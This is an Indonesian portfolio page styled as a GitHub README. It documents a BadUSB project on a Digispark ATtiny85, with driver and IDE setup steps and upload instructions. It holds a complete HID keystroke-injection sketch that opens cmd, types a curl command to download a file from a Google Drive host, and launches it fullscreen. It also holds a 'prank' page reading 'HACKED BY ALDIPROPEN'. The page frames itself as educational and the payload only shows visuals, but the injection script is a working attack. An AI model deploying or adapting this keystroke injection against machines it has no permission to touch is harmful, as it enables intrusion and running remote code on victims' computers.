@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>arizalarfah/badusb-digispark</title>
+<meta name="description" content="Dokumentasi workflow BadUSB Digispark ATtiny85: instalasi driver &amp; Arduino IDE, source code sketch HID injection, dan payload halaman prank — untuk pembelajaran keamanan fisik/hardware.">
+<style>
+  :root {
+    --bg: #0d1117;
+    --bg-panel: #161b22;
+    --bg-panel-hover: #1c2128;
+    --border: #30363d;
+    --text: #c9d1d9;
+    --text-muted: #8b949e;
+    --link: #58a6ff;
+    --green: #3fb950;
+    --yellow: #d29922;
+    --red: #f85149;
+    --purple: #a371f7;
+    --topic-bg: #388bfd1a;
+    --topic-text: #79c0ff;
+    --radius: 6px;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+  a { color: var(--link); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  code, pre { font-family: ui-monospace, "Courier New", Courier, monospace; }
+
+  /* TOP BAR */
+  .topbar { background: var(--bg-panel); border-bottom: 1px solid var(--border); padding: 12px 20px; }
+  .topbar-inner { max-width: 1180px; margin: 0 auto; display: flex; align-items: center; gap: 12px; }
+  .site-mark { font-size: 20px; }
+  .back-link { color: var(--text-muted); font-size: 13px; margin-left: auto; }
+  .back-link:hover { color: var(--text); }
+
+  /* REPO HEADER */
+  .repo-header { max-width: 1180px; margin: 0 auto; padding: 20px 20px 0; }
+  .breadcrumb { font-size: 20px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
+  .breadcrumb .owner { color: var(--link); }
+  .breadcrumb .repo { color: var(--text); font-weight: 600; }
+  .visibility-badge { display: inline-flex; align-items: center; border: 1px solid var(--border); border-radius: 2em; padding: 0 8px; font-size: 12px; color: var(--text-muted); margin-left: 4px; }
+  .repo-desc { color: var(--text-muted); font-size: 14px; margin: 10px 0 16px; max-width: 720px; }
+
+  .repo-tabs { display: flex; gap: 4px; border-bottom: 1px solid var(--border); overflow-x: auto; }
+  .repo-tabs span { display: inline-flex; align-items: center; gap: 6px; padding: 8px 12px; font-size: 14px; color: var(--text-muted); border-bottom: 2px solid transparent; white-space: nowrap; }
+  .repo-tabs span.active { color: var(--text); border-bottom-color: var(--red); font-weight: 600; }
+
+  /* LAYOUT */
+  .layout { max-width: 1180px; margin: 0 auto; padding: 16px 20px 80px; display: grid; grid-template-columns: 1fr 296px; gap: 24px; align-items: start; }
+
+  /* FILE LIST */
+  .file-list { border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; margin-bottom: 24px; }
+  .file-list-header { background: var(--bg-panel); padding: 10px 16px; font-size: 12.5px; color: var(--text-muted); border-bottom: 1px solid var(--border); }
+  .file-row { display: flex; align-items: center; gap: 10px; padding: 8px 16px; border-bottom: 1px solid var(--border); font-size: 13px; }
+  .file-row:last-child { border-bottom: none; }
+  .file-row .fname { color: var(--link); min-width: 190px; }
+  .file-row .fdesc { color: var(--text-muted); }
+
+  /* README PANEL */
+  .readme-panel { border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+  .readme-title { display: flex; align-items: center; gap: 8px; background: var(--bg-panel); padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 13.5px; font-weight: 600; }
+  .readme-body { padding: 24px 32px 36px; }
+  .readme-body h1 { font-size: 26px; font-weight: 700; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 16px; }
+  .readme-body h2 { font-size: 20px; font-weight: 700; border-bottom: 1px solid var(--border); padding-bottom: 8px; margin: 32px 0 14px; }
+  .readme-body h3 { font-size: 16px; font-weight: 700; margin: 22px 0 10px; }
+  .readme-body p { margin: 0 0 14px; color: var(--text); }
+  .readme-body ul, .readme-body ol { margin: 0 0 14px; padding-left: 26px; }
+  .readme-body li { margin-bottom: 6px; }
+  .readme-body strong { color: #fff; }
+  .readme-body code { background: rgba(110,118,129,0.2); padding: 0.15em 0.4em; border-radius: 4px; font-size: 12.5px; }
+
+  .badge-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 18px; }
+  .badge { display: inline-flex; align-items: center; gap: 4px; background: var(--bg-panel); border: 1px solid var(--border); border-radius: 4px; padding: 3px 8px; font-size: 11.5px; color: var(--text-muted); }
+  .badge.b-red { color: #ffa198; border-color: rgba(248,81,73,0.4); }
+  .badge.b-green { color: #7ee787; border-color: rgba(63,185,80,0.4); }
+  .badge.b-blue { color: var(--topic-text); border-color: rgba(56,139,253,0.4); }
+
+  /* ADMONITIONS */
+  .admonition { border-left: 4px solid; border-radius: 4px; padding: 10px 14px; margin: 0 0 18px; background: var(--bg-panel); }
+  .admonition .adm-title { display: flex; align-items: center; gap: 6px; font-weight: 700; font-size: 13px; margin-bottom: 4px; }
+  .admonition p { margin: 0; font-size: 13.5px; color: var(--text); }
+  .admonition.caution { border-color: var(--red); }
+  .admonition.caution .adm-title { color: var(--red); }
+  .admonition.note { border-color: var(--link); }
+  .admonition.note .adm-title { color: var(--link); }
+  .admonition.tip { border-color: var(--green); }
+  .admonition.tip .adm-title { color: var(--green); }
+
+  /* CODE BLOCK */
+  .code-window { border: 1px solid var(--border); border-radius: var(--radius); margin: 0 0 18px; overflow: hidden; }
+  .code-tab { display: flex; align-items: center; gap: 8px; background: var(--bg-panel); padding: 8px 14px; font-size: 12.5px; color: var(--text-muted); border-bottom: 1px solid var(--border); }
+  .code-tab .dot { width: 8px; height: 8px; border-radius: 50%; }
+  .code-window pre { margin: 0; padding: 16px; overflow-x: auto; font-size: 12.5px; line-height: 1.65; color: #c9d1d9; background: #0d1117; white-space: pre; }
+  .code-window pre .c { color: #8b949e; } /* comment */
+  .code-window pre .s { color: #a5d6ff; } /* string */
+  .code-window pre .k { color: #ff7b72; } /* keyword */
+  .code-window pre .f { color: #d2a8ff; } /* function/type */
+
+  /* IMAGES */
+  .shot { border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; margin: 6px 0 6px; background: var(--bg-panel); }
+  .shot img { display: block; width: 100%; height: auto; }
+  .shot-caption { font-size: 12px; color: var(--text-muted); margin: 0 0 20px; }
+
+  .step-list { list-style: none; padding: 0; margin: 0 0 8px; counter-reset: step; }
+  .step-list li { position: relative; padding-left: 34px; margin-bottom: 14px; font-size: 13.5px; }
+  .step-list li::before { counter-increment: step; content: counter(step); position: absolute; left: 0; top: 0; width: 22px; height: 22px; border-radius: 50%; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text); font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
+
+  table.gfm-table { width: 100%; border-collapse: collapse; margin: 0 0 18px; font-size: 13px; }
+  table.gfm-table th, table.gfm-table td { border: 1px solid var(--border); padding: 6px 12px; text-align: left; }
+  table.gfm-table th { background: var(--bg-panel); }
+
+  hr.sep { border: none; border-top: 1px solid var(--border); margin: 28px 0; }
+
+  /* SIDEBAR */
+  .sidebar { display: flex; flex-direction: column; gap: 20px; }
+  .side-block { border-top: 1px solid var(--border); padding-top: 16px; }
+  .side-block:first-child { border-top: none; padding-top: 0; }
+  .side-title { display: flex; align-items: center; justify-content: space-between; font-size: 14px; font-weight: 700; margin-bottom: 10px; }
+  .side-block p { font-size: 13px; color: var(--text); margin: 0 0 12px; }
+  .topics { display: flex; flex-wrap: wrap; gap: 6px; }
+  .topic-pill { background: var(--topic-bg); color: var(--topic-text); border-radius: 2em; padding: 3px 12px; font-size: 12px; }
+  .side-list { list-style: none; padding: 0; margin: 0; font-size: 13px; }
+  .side-list li { display: flex; align-items: center; gap: 8px; padding: 5px 0; color: var(--text); }
+  .side-list li .ic { color: var(--text-muted); }
+
+  footer.page-footer { max-width: 1180px; margin: 0 auto; padding: 0 20px 40px; text-align: center; font-size: 12px; color: var(--text-muted); }
+
+  @media (max-width: 900px) {
+    .layout { grid-template-columns: 1fr; }
+    .sidebar { order: -1; border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; }
+    .side-block { border-top: none; padding-top: 0; }
+    .readme-body { padding: 20px 18px 28px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <div class="topbar-inner">
+      <span class="site-mark">🔌</span>
+      <strong>arizal.my.id</strong>
+      <a class="back-link" href="../index.html#portfolio">&#8592; Kembali ke Portfolio</a>
+    </div>
+  </div>
+
+  <div class="repo-header">
+    <div class="breadcrumb">
+      <span class="owner">arizalarfah</span> / <span class="repo">badusb-digispark</span>
+      <span class="visibility-badge">Public</span>
+    </div>
+    <p class="repo-desc">Workflow &amp; source code BadUSB berbasis Digispark ATtiny85 — HID keystroke injection sketch dan payload halaman "prank", didokumentasikan untuk pembelajaran keamanan fisik/hardware &amp; kesadaran risiko perangkat USB tak dikenal.</p>
+    <nav class="repo-tabs" aria-label="Repo nav (dekoratif)">
+      <span class="active">&lt;&gt; Code</span>
+      <span>Issues</span>
+      <span>Pull requests</span>
+      <span>Actions</span>
+      <span>Security</span>
+    </nav>
+  </div>
+
+  <div class="layout">
+    <main>
+
+      <div class="file-list">
+        <div class="file-list-header">3 files</div>
+        <div class="file-row"><span class="fname">📄 badusb-digispark.ino</span><span class="fdesc">Digispark HID injection sketch (keystroke payload)</span></div>
+        <div class="file-row"><span class="fname">📄 payload.html</span><span class="fdesc">Halaman "prank" yang dibuka otomatis (matrix rain + glitch text)</span></div>
+        <div class="file-row"><span class="fname">📄 README.md</span><span class="fdesc">Dokumentasi workflow (halaman ini)</span></div>
+      </div>
+
+      <div class="readme-panel">
+        <div class="readme-title">📖 README.md</div>
+        <div class="readme-body">
+
+          <h1>🔌 BadUSB Digispark (ATtiny85)</h1>
+          <div class="badge-row">
+            <span class="badge b-red">⚠ educational-use-only</span>
+            <span class="badge">hardware: digispark attiny85</span>
+            <span class="badge b-blue">Arduino IDE 2.3.10</span>
+            <span class="badge b-green">library: DigiKeyboardBe</span>
+          </div>
+
+          <div class="admonition caution">
+            <div class="adm-title">⚠️ CAUTION — Etika &amp; Batasan Penggunaan</div>
+            <p>BadUSB adalah teknik HID injection: perangkat menyamar sebagai keyboard dan mengetik perintah otomatis begitu dicolok. Dokumentasi ini dibuat untuk <strong>pembelajaran keamanan fisik/hardware, riset keamanan, dan kesadaran risiko (security awareness)</strong> — bukan untuk dipakai pada perangkat milik orang lain tanpa izin eksplisit. Payload contoh di halaman ini hanya menampilkan layar "prank" (efek visual), tidak melakukan pencurian data, kerusakan sistem, atau eksfiltrasi apa pun — tapi teknik keystroke injection-nya sendiri bisa dipakai untuk hal yang jauh lebih berbahaya, jadi perlakukan seperti materi red-team: hanya pada perangkat/lingkungan yang kamu punya izin untuk menguji.</p>
+          </div>
+
+          <h2 id="overview">Overview</h2>
+          <p>Digispark ATtiny85 diprogram lewat Arduino IDE + library <a href="https://github.com/IncroyablePix/DigiKeyboardBe" target="_blank" rel="noopener">DigiKeyboardBe</a> supaya dikenali komputer target sebagai keyboard USB. Begitu dicolok, ia otomatis mengetik urutan tombol: buka <strong>Run</strong> (Win+R) &rarr; buka <strong>cmd</strong> &rarr; jalankan <code>curl</code> untuk mengunduh sebuah file HTML &rarr; membukanya di browser secara fullscreen. File HTML itu berisi layar "HACKED BY..." dengan animasi matrix-rain &amp; glitch text — murni tampilan, tanpa payload berbahaya.</p>
+
+          <h2 id="bom">Hardware</h2>
+          <table class="gfm-table">
+            <thead><tr><th>Komponen</th><th>Keterangan</th></tr></thead>
+            <tbody>
+              <tr><td>Digispark ATtiny85 (board <code>HW-018</code>)</td><td>Mikrokontroler USB kecil, disamarkan sebagai keyboard (HID)</td></tr>
+              <tr><td>Arduino IDE 2.3.10</td><td>Untuk menulis &amp; upload sketch ke Digispark</td></tr>
+              <tr><td>Library <code>DigiKeyboardBe</code></td><td>Wrapper HID keyboard untuk Digispark (layout Belgian AZERTY, tetap dipakai walau target keyboard lain — lihat catatan di bagian Instalasi)</td></tr>
+            </tbody>
+          </table>
+          <div class="shot">
+            <img src="img/01-hardware-board.png" alt="Board Digispark ATtiny85 (HW-018)" loading="lazy">
+          </div>
+          <p class="shot-caption">Board Digispark ATtiny85 (HW-018) yang dipakai di project ini.</p>
+
+          <h2 id="instalasi">Instalasi</h2>
+
+          <h3>1. Download &amp; Install Driver</h3>
+          <p>Digispark butuh driver USB khusus (bukan CH340) supaya dikenali Windows. Driver: <a href="https://drive.google.com/file/d/1d_gMUbYlfsbJIEGwAH9p-QAmHWSF3rou/view?usp=sharing" target="_blank" rel="noopener">Download Driver Digispark</a>, lalu jalankan installer di dalamnya.</p>
+          <div class="shot">
+            <img src="img/02-driver-files.png" alt="Isi folder driver Digispark yang sudah diekstrak" loading="lazy">
+          </div>
+          <p class="shot-caption">Isi package driver setelah diekstrak: <code>Install Drivers</code>, <code>DPinst</code>/<code>DPinst64</code>, dan komponen digiusb/digiserial.</p>
+
+          <h3>2. Tambahkan Boards Manager URL</h3>
+          <ol class="step-list">
+            <li>Buka Arduino IDE &rarr; <strong>File &rarr; Preferences</strong>.</li>
+            <li>Pada <strong>Additional boards manager URLs</strong>, isi: <code>http://digistump.com/package_digistump_index.json</code>, lalu klik <strong>OK</strong>.</li>
+          </ol>
+          <div class="shot">
+            <img src="img/03-ide-preferences-boards-url.png" alt="Preferences Arduino IDE dengan Additional Boards Manager URL Digistump" loading="lazy">
+          </div>
+          <p class="shot-caption">Preferences &rarr; Settings, URL Digistump sudah ditambahkan di kolom Additional boards manager URLs.</p>
+
+          <h3>3. Install Library <code>DigiKeyboardBe</code></h3>
+          <p>Buka Library Manager (ikon buku di sidebar), cari <code>digiKe</code>, lalu install <strong>DigiKeyboardBe by IncroyablePix</strong>.</p>
+          <div class="shot">
+            <img src="img/04-library-manager.png" alt="Library Manager dengan DigiKeyboardBe terinstall" loading="lazy">
+          </div>
+          <p class="shot-caption">Library Manager: <code>DigiKeyboardBe</code> versi 1.0.0 sudah terinstall.</p>
+          <div class="admonition note">
+            <div class="adm-title">ℹ️ NOTE</div>
+            <p><code>DigiKeyboardBe</code> memetakan layout keyboard Belgian AZERTY. Kalau target komputer memakai layout lain (mis. US QWERTY/Indonesia), karakter yang diketik bisa meleset — sesuaikan library/layout sesuai keyboard target sebelum dipakai.</p>
+          </div>
+
+          <h3>4. Pilih Board</h3>
+          <p><strong>Tools &rarr; Board &rarr; Digistump AVR Boards &rarr; Digispark (Default - 16.5mhz)</strong>.</p>
+          <div class="shot">
+            <img src="img/05-board-select.png" alt="Memilih board Digispark Default 16.5mhz di menu Tools > Board" loading="lazy">
+          </div>
+          <p class="shot-caption">Tools &rarr; Board &rarr; Digistump AVR Boards &rarr; <em>Digispark (Default - 16.5mhz)</em> dipilih.</p>
+
+          <h2 id="source">Source Code</h2>
+          <p>Sketch <code>.ino</code> untuk Digispark. Jeda-jeda (<code>delay</code>) diberi cukup panjang supaya Run dialog dan Command Prompt sempat terbuka sebelum ketikan berikutnya dikirim.</p>
+          <div class="code-window">
+            <div class="code-tab"><span class="dot" style="background:#f85149"></span><span class="dot" style="background:#d29922"></span><span class="dot" style="background:#3fb950"></span>&nbsp;badusb-digispark.ino</div>
+            <pre>#include "DigiKeyboard.h"
+
+void setup() {
+  <span class="c">// ── JEDA AWAL ──────────────────────────────────────────────────────────</span>
+  DigiKeyboard.update();
+  DigiKeyboard.delay(<span class="s">3000</span>);
+
+  <span class="c">// ── BUKA RUN DIALOG (WIN+R) ────────────────────────────────────────────</span>
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(<span class="s">1500</span>);
+
+  <span class="c">// ── KETIK CMD DAN EKSEKUSI ─────────────────────────────────────────────</span>
+  DigiKeyboard.update();
+  DigiKeyboard.print(<span class="s">"cmd"</span>);
+  DigiKeyboard.delay(<span class="s">500</span>);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(<span class="s">2000</span>); <span class="c">// Jeda agar CMD siap menerima ketikan</span>
+
+  <span class="c">// ── KETIK PERINTAH CURL LANGSUNG ───────────────────────────────────────</span>
+  DigiKeyboard.update();
+  DigiKeyboard.print(<span class="s">"curl -L -o ARIZAL(payload).html  \"https://drive.google.com/uc?export=download&amp;confirm=t&amp;id=1v4PpteMicm-G6I4KSgTA1KrYv-9Ih9AC\""</span>);
+  DigiKeyboard.delay(<span class="s">500</span>);
+
+  <span class="c">// ── EKSEKUSI ENTER ─────────────────────────────────────────────────────</span>
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(<span class="s">5000</span>);
+
+  DigiKeyboard.update();
+  DigiKeyboard.print(<span class="s">"start ARIZAL(payload).html"</span>);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(<span class="s">2000</span>);
+  DigiKeyboard.sendKeyStroke(KEY_F11);
+  DigiKeyboard.delay(<span class="s">500</span>);
+}
+
+void loop() {
+  DigiKeyboard.update();
+}</pre>
+          </div>
+          <p>Source asli sketch ini juga tersedia di Drive: <a href="https://drive.google.com/file/d/1dJg8f4JVlwu4MNa8vlOmYzCY_hJp4utO/view?usp=sharing" target="_blank" rel="noopener">badusb-digispark.ino (Google Drive)</a>.</p>
+
+          <h3>Alur Eksekusi</h3>
+          <table class="gfm-table">
+            <thead><tr><th>Langkah</th><th>Aksi</th></tr></thead>
+            <tbody>
+              <tr><td>1</td><td>Device dicolok, jeda 3 detik supaya OS selesai mendaftarkan HID</td></tr>
+              <tr><td>2</td><td><kbd>Win</kbd>+<kbd>R</kbd> membuka dialog Run</td></tr>
+              <tr><td>3</td><td>Ketik <code>cmd</code> + Enter &rarr; Command Prompt terbuka</td></tr>
+              <tr><td>4</td><td><code>curl</code> mengunduh <code>payload.html</code> dari Google Drive</td></tr>
+              <tr><td>5</td><td><code>start</code> membuka file di browser default, lalu <kbd>F11</kbd> memaksa fullscreen</td></tr>
+            </tbody>
+          </table>
+
+          <h2 id="payload">Payload — <code>payload.html</code></h2>
+          <p>Halaman yang otomatis terbuka: efek "matrix rain" di canvas, judul glitch <strong>"HACKED BY ALDIPROPEN"</strong>, terminal palsu dengan efek typewriter, dan jam realtime. Tidak ada permintaan jaringan keluar, tidak ada pengumpulan data — murni CSS animation + JS canvas/DOM, untuk efek kejut visual saja.</p>
+          <div class="code-window">
+            <div class="code-tab"><span class="dot" style="background:#f85149"></span><span class="dot" style="background:#d29922"></span><span class="dot" style="background:#3fb950"></span>&nbsp;payload.html</div>
+            <pre>&lt;!DOCTYPE html&gt;
+&lt;html lang="id"&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+&lt;title&gt;SYSTEM COMPROMISED&lt;/title&gt;
+&lt;style&gt;
+  <span class="c">/* --- RESET &amp; BASIC STYLES --- */</span>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background-color: #000;
+    color: #0f0;
+    font-family: 'Courier New', Courier, monospace;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  <span class="c">/* --- CANVAS BACKGROUND (MATRIX RAIN) --- */</span>
+  #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.35; }
+  <span class="c">/* --- MAIN CONTENT CONTAINER --- */</span>
+  .container {
+    position: relative; z-index: 10; text-align: center; padding: 30px;
+    background: rgba(0, 0, 0, 0.85); border: 1px solid #0f0;
+    box-shadow: 0 0 20px rgba(0, 255, 0, 0.4), inset 0 0 15px rgba(0, 255, 0, 0.2);
+    max-width: 750px; width: 90%; border-radius: 4px;
+  }
+  <span class="c">/* --- SKULL IMAGE STYLING --- */</span>
+  .skull-img {
+    width: 350px; max-width: 80%; height: auto; margin-bottom: 15px;
+    border-radius: 8px; border: 2px solid #ff0033;
+    box-shadow: 0 0 20px rgba(255, 0, 51, 0.8);
+    animation: pulse-glow 2s infinite ease-in-out;
+  }
+  @keyframes pulse-glow {
+    0% { box-shadow: 0 0 15px rgba(255, 0, 51, 0.6); transform: scale(1); }
+    50% { box-shadow: 0 0 30px rgba(255, 0, 51, 1); transform: scale(1.03); }
+    100% { box-shadow: 0 0 15px rgba(255, 0, 51, 0.6); transform: scale(1); }
+  }
+  <span class="c">/* --- GLITCH TEXT EFFECT --- */</span>
+  .glitch {
+    font-size: 2.5rem; font-weight: bold; color: #ff0033;
+    text-shadow: 0 0 10px #ff0033, 0 0 20px #ff0033;
+    position: relative; letter-spacing: 2px; margin-bottom: 10px;
+    animation: glitch 1s infinite alternate;
+  }
+  @keyframes glitch {
+    0% { text-shadow: 2px 0 0 red, -2px 0 0 blue; }
+    50% { text-shadow: -2px 0 0 red, 2px 0 0 cyan; }
+    100% { text-shadow: 1px -1px 0 red, -1px 1px 0 lime; }
+  }
+  .subtitle { color: #888; font-size: 0.85rem; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 3px; }
+  <span class="c">/* --- TERMINAL &amp; LOG BOX --- */</span>
+  .terminal {
+    text-align: left; background: #050505; padding: 15px;
+    border-left: 3px solid #ff0033; font-size: 0.9rem; line-height: 1.6;
+    margin-bottom: 20px; min-height: 110px;
+  }
+  .cursor { display: inline-block; width: 8px; height: 15px; background: #0f0; animation: blink 0.8s infinite; vertical-align: middle; }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+  <span class="c">/* --- WARNING BADGE --- */</span>
+  .status-badge {
+    display: inline-block; background: #ff0033; color: #fff; padding: 6px 16px;
+    font-weight: bold; font-size: 0.85rem; letter-spacing: 2px; border-radius: 2px;
+    box-shadow: 0 0 10px rgba(255, 0, 51, 0.8);
+  }
+  .footer { margin-top: 15px; font-size: 0.75rem; color: #f5f5f5; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;canvas id="matrix"&gt;&lt;/canvas&gt;
+&lt;div class="container"&gt;
+  &lt;img src="https://lh3.googleusercontent.com/d/1yA3aJGadyHdoqu7kSNaHJCydNmDeMwAP"
+       alt="Cyber Skull" class="skull-img"
+       onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&amp;w=500';"&gt;
+  &lt;div class="glitch"&gt;HACKED BY ALDIPROPEN&lt;/div&gt;
+  &lt;div class="subtitle"&gt;-- SYSTEM SECURITY BREACHED --&lt;/div&gt;
+  &lt;div class="terminal"&gt;&lt;span id="typewriter"&gt;&lt;/span&gt;&lt;span class="cursor"&gt;&lt;/span&gt;&lt;/div&gt;
+  &lt;div class="status-badge"&gt;ACCESS DENIED&lt;/div&gt;
+  &lt;div class="footer"&gt;IP REGISTRATION LOGGED | TIME: &lt;span id="clock"&gt;&lt;/span&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+  <span class="c">/* --- 1. MATRIX RAIN EFFECT --- */</span>
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+  resizeCanvas();
+  window.addEventListener('resize', resizeCanvas);
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&amp;*()*&amp;^%';
+  const fontSize = 14;
+  let columns = Math.floor(canvas.width / fontSize);
+  let drops = Array(columns).fill(1);
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0f0';
+    ctx.font = fontSize + 'px monospace';
+    columns = Math.floor(canvas.width / fontSize);
+    if (drops.length &lt; columns) { while (drops.length &lt; columns) drops.push(1); }
+    for (let i = 0; i &lt; drops.length; i++) {
+      const text = chars.charAt(Math.floor(Math.random() * chars.length));
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize &gt; canvas.height &amp;&amp; Math.random() &gt; 0.975) { drops[i] = 0; }
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 33);
+  <span class="c">/* --- 2. TYPEWRITER EFFECT --- */</span>
+  const textToType = [
+    "&gt; Initializing payload...",
+    "&gt; Security protocol bypassed.",
+    "&gt; Root access granted to server.",
+    "&gt; Your system security is an illusion.",
+    "&gt; We are watching you."
+  ];
+  let lineIndex = 0, charIndex = 0;
+  const typewriterElement = document.getElementById('typewriter');
+  function typeLine() {
+    if (lineIndex &lt; textToType.length) {
+      if (charIndex &lt; textToType[lineIndex].length) {
+        typewriterElement.innerHTML += textToType[lineIndex].charAt(charIndex);
+        charIndex++;
+        setTimeout(typeLine, 40);
+      } else {
+        typewriterElement.innerHTML += "&lt;br&gt;";
+        lineIndex++; charIndex = 0;
+        setTimeout(typeLine, 300);
+      }
+    }
+  }
+  setTimeout(typeLine, 800);
+  <span class="c">/* --- 3. LIVE CLOCK --- */</span>
+  function updateClock() { document.getElementById('clock').innerText = new Date().toUTCString(); }
+  setInterval(updateClock, 1000);
+  updateClock();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+          </div>
+          <p>Source asli file ini juga tersedia di Drive: <a href="https://drive.google.com/file/d/1v4PpteMicm-G6I4KSgTA1KrYv-9Ih9AC/view?usp=sharing" target="_blank" rel="noopener">payload.html (Google Drive)</a>.</p>
+          <div class="admonition tip">
+            <div class="adm-title">💡 TIP</div>
+            <p>Karena tidak ada permintaan jaringan keluar atau akses file system di <code>payload.html</code>, halaman ini aman dibuka/dites langsung di browser mana pun tanpa perlu perangkat Digispark — cukup untuk melihat efeknya.</p>
+          </div>
+
+          <h2 id="upload">Upload Sketch ke Digispark</h2>
+          <ol class="step-list">
+            <li>Klik tombol <strong>Upload</strong> (ikon panah) di Arduino IDE.</li>
+            <li>Saat muncul <em>"Plug in device now... (will timeout in 60 seconds)"</em>, colokkan Digispark ke port USB.</li>
+            <li>Tunggu proses <em>Uploading...</em> selesai — Digispark otomatis reset &amp; langsung menjalankan sketch begitu upload selesai.</li>
+          </ol>
+          <div class="shot">
+            <img src="img/06-compile-upload.png" alt="Output kompilasi &amp; proses upload sketch ke Digispark" loading="lazy">
+          </div>
+          <p class="shot-caption">Output build: <code>Sketch uses 3010 bytes (50%) of program storage space</code>, menunggu device dicolok untuk mulai upload.</p>
+
+          <hr class="sep">
+
+          <h2 id="referensi">Referensi</h2>
+          <ul>
+            <li><a href="https://github.com/IncroyablePix/DigiKeyboardBe" target="_blank" rel="noopener">github.com/IncroyablePix/DigiKeyboardBe</a> — library keyboard HID untuk Digispark</li>
+            <li><a href="https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7" target="_blank" rel="noopener">github.com/digistump/DigistumpArduino</a> — core Arduino resmi untuk board Digistump/Digispark</li>
+          </ul>
+
+        </div>
+      </div>
+    </main>
+
+    <aside class="sidebar">
+      <div class="side-block">
+        <div class="side-title">📖 About</div>
+        <p>Workflow lengkap membangun BadUSB dengan Digispark ATtiny85: instalasi driver &amp; Arduino IDE, source code HID injection, payload "prank" HTML, sampai proses upload ke device. Dibuat untuk pembelajaran keamanan fisik/hardware.</p>
+        <div class="topics">
+          <span class="topic-pill">badusb</span>
+          <span class="topic-pill">digispark</span>
+          <span class="topic-pill">attiny85</span>
+          <span class="topic-pill">hid-injection</span>
+          <span class="topic-pill">arduino</span>
+          <span class="topic-pill">physical-security</span>
+          <span class="topic-pill">red-team</span>
+          <span class="topic-pill">security-research</span>
+        </div>
+      </div>
+      <div class="side-block">
+        <div class="side-title">Files</div>
+        <ul class="side-list">
+          <li><span class="ic">📄</span> badusb-digispark.ino</li>
+          <li><span class="ic">📄</span> payload.html</li>
+          <li><span class="ic">📄</span> README.md</li>
+        </ul>
+      </div>
+      <div class="side-block">
+        <div class="side-title">Hardware</div>
+        <ul class="side-list">
+          <li><span class="ic">🔌</span> Digispark ATtiny85 (HW-018)</li>
+        </ul>
+      </div>
+    </aside>
+  </div>
+
+  <footer class="page-footer">
+    <p>badusb-digispark — dokumentasi keamanan fisik/hardware, Arizal (arizal.my.id). Untuk penggunaan edukasi &amp; pengujian yang sah/berizin saja.</p>
+  </footer>
+
+</body>
+</html>
